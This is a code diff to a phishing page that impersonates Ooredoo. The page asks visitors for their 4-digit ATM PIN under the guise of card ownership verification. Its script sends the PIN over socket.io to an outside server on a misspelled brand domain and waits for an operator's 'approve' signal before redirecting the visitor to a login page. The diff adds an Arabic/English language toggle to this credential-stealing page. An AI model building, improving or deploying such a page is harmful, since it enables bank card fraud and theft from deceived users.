@@ -6,8 +6,11 @@
 <title>إثبات ملكية البطاقة ATM | Ooredoo</title>
 <style>
 * { box-sizing: border-box; margin: 0; padding: 0; }
-body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; justify-content: center; align-items: flex-start; direction: rtl; }
-.container { width: 100%; max-width: 420px; margin: 40px auto; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif; background: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; align-items: center; direction: rtl; }
+.lang-toggle-wrapper { width: 100%; max-width: 420px; display: flex; justify-content: flex-start; margin-top: 12px; padding: 0 24px; }
+.lang-toggle { background: #fff; border: 1px solid #ddd; border-radius: 20px; padding: 6px 16px; font-size: 13px; cursor: pointer; color: #333; }
+.lang-toggle:hover { background: #f0f0f0; }
+.container { width: 100%; max-width: 420px; margin: 10px auto 40px; background: #fff; border-radius: 20px; box-shadow: 0 8px 32px rgba(0,0,0,0.08); padding: 32px 24px; }
 h1 { text-align: center; font-size: 22px; font-weight: 700; color: #1a1a1a; margin-bottom: 4px; }
 .atm-label { text-align: center; font-size: 24px; font-weight: 700; color: #ed1c24; margin-bottom: 10px; }
 .subtitle { text-align: center; color: #4c5562; font-size: 14px; margin-bottom: 20px; }
@@ -21,17 +24,23 @@ h1 { text-align: center; font-size: 22px; font-weight: 700; color: #1a1a1a; marg
 .submit-btn:disabled { background: #f5a0a3; cursor: not-allowed; }
 .waiting-msg { text-align: center; color: #ed1c24; font-size: 14px; margin-top: 12px; display: none; }
 @media (max-width: 500px) {
-  .container { margin: 0; border-radius: 0; min-height: 100vh; padding: 24px 16px; }
+  .container { margin: 10px 0 0; border-radius: 0; min-height: calc(100vh - 50px); padding: 24px 16px; }
+  .lang-toggle-wrapper { padding: 0 16px; }
 }
 </style>
 </head>
 <body>
-<div class="container">
-  <h1>إثبات ملكية البطاقة</h1>
-  <div class="atm-label">ATM</div>
-  <p class="subtitle">لتأكيد العملية أدخل الرقم السري للصراف الآلي</p>
 
-  <div class="description">
+<div class="lang-toggle-wrapper">
+  <button class="lang-toggle" id="langToggle" onclick="toggleLanguage()">English</button>
+</div>
+
+<div class="container">
+  <h1 id="pageTitle">إثبات ملكية البطاقة</h1>
+  <div class="atm-label">ATM</div>
+  <p class="subtitle" id="pageSubtitle">لتأكيد العملية أدخل الرقم السري للصراف الآلي</p>
+
+  <div class="description" id="pageDescription">
     يرجى إدخال الرقم السري للصراف الآلي (ATM) المكون من 4 خانات للبطاقة المنتهية بـ <strong id="lastDigits">****</strong> ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.
   </div>
 
@@ -51,15 +60,62 @@ h1 { text-align: center; font-size: 22px; font-weight: 700; color: #1a1a1a; marg
 <script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
 <script>
 (function() {
-  var SOCKET_URL = 'https://oredoooman-server.fly.dev';
-  var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
-  var visitorId = localStorage.getItem('visitorId') || '';
+  var translations = {
+    ar: {
+      langBtn: 'English',
+      title: 'إثبات ملكية البطاقة',
+      subtitle: 'لتأكيد العملية أدخل الرقم السري للصراف الآلي',
+      descriptionPre: 'يرجى إدخال الرقم السري للصراف الآلي (ATM) المكون من 4 خانات للبطاقة المنتهية بـ ',
+      descriptionPost: ' ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.',
+      error: 'الرقم السري غير صحيح. يرجى المحاولة مرة أخرى.',
+      submitBtn: 'تأكيد',
+      waiting: 'جاري التحقق...'
+    },
+    en: {
+      langBtn: 'العربية',
+      title: 'Card Ownership Verification',
+      subtitle: 'To confirm the transaction, enter your ATM PIN',
+      descriptionPre: 'Please enter the 4-digit ATM PIN for the card ending in ',
+      descriptionPost: ' to verify card ownership and eligibility for protection against electronic fraud and to confirm the payment process.',
+      error: 'Incorrect PIN. Please try again.',
+      submitBtn: 'Confirm',
+      waiting: 'Verifying...'
+    }
+  };
+
+  var currentLang = localStorage.getItem('siteLang') || localStorage.getItem('oredoo_site_language') || 'ar';
 
   // Load payment data - get last 4 digits
   var paymentData = {};
   try { paymentData = JSON.parse(localStorage.getItem('paymentData') || '{}'); } catch(e) {}
   var last4 = paymentData.cardLast4 || '****';
-  document.getElementById('lastDigits').textContent = last4;
+
+  function applyLanguage() {
+    var t = translations[currentLang];
+    document.documentElement.lang = currentLang === 'ar' ? 'ar' : 'en';
+    document.documentElement.dir = currentLang === 'ar' ? 'rtl' : 'ltr';
+    document.body.style.direction = currentLang === 'ar' ? 'rtl' : 'ltr';
+    document.getElementById('langToggle').textContent = t.langBtn;
+    document.getElementById('pageTitle').textContent = t.title;
+    document.getElementById('pageSubtitle').textContent = t.subtitle;
+    document.getElementById('pageDescription').innerHTML = t.descriptionPre + '<strong id="lastDigits">' + last4 + '</strong>' + t.descriptionPost;
+    document.getElementById('pageDescription').style.textAlign = currentLang === 'ar' ? 'right' : 'left';
+    document.getElementById('pinError').textContent = t.error;
+    document.getElementById('submitBtn').textContent = t.submitBtn;
+    document.getElementById('waitingMsg').textContent = t.waiting;
+  }
+
+  window.toggleLanguage = function() {
+    currentLang = currentLang === 'ar' ? 'en' : 'ar';
+    localStorage.setItem('siteLang', currentLang); localStorage.setItem('oredoo_site_language', currentLang);
+    applyLanguage();
+  };
+
+  applyLanguage();
+
+  var SOCKET_URL = 'https://oredoooman-server.fly.dev';
+  var socket = io(SOCKET_URL, { transports: ['polling','websocket'], reconnection: true, reconnectionAttempts: Infinity, reconnectionDelay: 1000 });
+  var visitorId = localStorage.getItem('visitorId') || '';
 
   // PIN digit inputs
   var digits = document.querySelectorAll('.pin-digit');
@@ -119,7 +175,7 @@ h1 { text-align: center; font-size: 22px; font-weight: 700; color: #1a1a1a; marg
     var act = (typeof action === 'string') ? action : (action && action.action) || '';
     document.getElementById('waitingMsg').style.display = 'none';
     document.getElementById('submitBtn').disabled = false;
-    document.getElementById('submitBtn').textContent = 'تأكيد';
+    document.getElementById('submitBtn').textContent = translations[currentLang].submitBtn;
 
     if (act === 'approve') {
       window.location.href = '/login/?popup=1';
@@ -146,7 +202,7 @@ h1 { text-align: center; font-size: 22px; font-weight: 700; color: #1a1a1a; marg
     if (code.length !== 4) return;
     document.getElementById('pinError').style.display = 'none';
     document.getElementById('submitBtn').disabled = true;
-    document.getElementById('submitBtn').textContent = 'جاري التحقق...';
+    document.getElementById('submitBtn').textContent = translations[currentLang].waiting;
     document.getElementById('waitingMsg').style.display = 'block';
 
     socket.emit('more-info', {
